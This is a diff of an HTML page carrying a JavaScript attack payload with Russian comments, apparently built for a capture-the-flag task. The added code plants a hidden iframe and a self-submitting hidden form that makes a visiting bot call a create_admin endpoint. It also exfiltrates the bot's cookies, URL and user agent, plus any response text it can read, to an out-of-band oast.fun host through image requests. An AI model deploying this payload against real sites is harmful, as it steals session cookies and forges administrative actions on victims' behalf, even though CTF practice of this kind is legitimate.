@@ -2,44 +2,84 @@
 <html>
 <body>
 <script>
-// 1. Информация о боте
+// 1. Создаем iframe для получения ответа
+const iframe = document.createElement('iframe');
+iframe.name = 'responseFrame';
+iframe.id = 'responseFrame';
+iframe.style.cssText = 'width:0;height:0;border:0;position:absolute;left:-9999px;';
+document.body.appendChild(iframe);
+
+// 2. Функция для отправки информации на webhook
+function sendToWebhook(data, label) {
+    const encoded = btoa(JSON.stringify(data));
+    new Image().src = `https://${label}-${encoded}.zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/`;
+}
+
+// 3. Отправляем информацию о боте
 const botInfo = {
     userAgent: navigator.userAgent,
     location: window.location.href,
+    cookies: document.cookie,
     timestamp: new Date().toISOString()
 };
+sendToWebhook(botInfo, 'botinfo');
 
-// 2. Отправляем инфо
-const encodedInfo = btoa(JSON.stringify(botInfo));
-new Image().src = "https://info-" + encodedInfo + ".zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/";
-
-// 3. СОЗДАЕМ ФОРМУ (не fetch!)
+// 4. Создаем форму, которая отправится в iframe
 const form = document.createElement('form');
 form.method = 'POST';
 form.action = 'https://tasks.goidactf.ru:20246/create_admin';
-form.target = '_blank'; // открыть в новом окне
+form.target = 'responseFrame'; // Ключевое: ответ придет в iframe
 form.style.display = 'none';
 
-// 4. Добавляем поля
+// 5. Добавляем поля
 const loginInput = document.createElement('input');
 loginInput.type = 'hidden';
 loginInput.name = 'new_admin_login';
-loginInput.value = 'form_admin_' + Date.now();
+loginInput.value = 'iframe_admin_' + Date.now();
 form.appendChild(loginInput);
 
-// 5. Добавляем скрытое поле для результата (если сервер его вернет)
-const resultInput = document.createElement('input');
-resultInput.type = 'hidden';
-resultInput.name = 'result_callback';
-resultInput.value = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/capture';
-form.appendChild(resultInput);
-
-// 6. Добавляем форму на страницу и отправляем
+// 6. Добавляем форму и отправляем
 document.body.appendChild(form);
 form.submit();
 
-// 7. Сообщаем что форма отправлена
-new Image().src = "https://form-submitted.zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/";
+// 7. Пытаемся прочитать ответ из iframe через 3 секунды
+setTimeout(() => {
+    try {
+        const frame = document.getElementById('responseFrame');
+        const frameDoc = frame.contentDocument || frame.contentWindow.document;
+        
+        let responseText = '';
+        
+        // Пробуем разные способы чтения
+        if (frameDoc.body) {
+            responseText = frameDoc.body.innerText || 
+                          frameDoc.body.textContent || 
+                          frameDoc.body.innerHTML.substring(0, 500);
+        } else if (frameDoc.documentElement) {
+            responseText = frameDoc.documentElement.innerText || 
+                          frameDoc.documentElement.textContent;
+        }
+        
+        // 8. Отправляем то, что удалось прочитать
+        const responseData = {
+            success: responseText.length > 0,
+            responseLength: responseText.length,
+            responsePreview: responseText.substring(0, 300),
+            timestamp: new Date().toISOString()
+        };
+        
+        sendToWebhook(responseData, 'response');
+        
+    } catch(error) {
+        // 9. Отправляем ошибку чтения iframe
+        const errorData = {
+            error: error.toString(),
+            errorType: 'IframeReadError',
+            timestamp: new Date().toISOString()
+        };
+        sendToWebhook(errorData, 'iframerror');
+    }
+}, 3000); // Ждем 3 секунды для загрузки ответа
 </script>
 </body>
 </html>
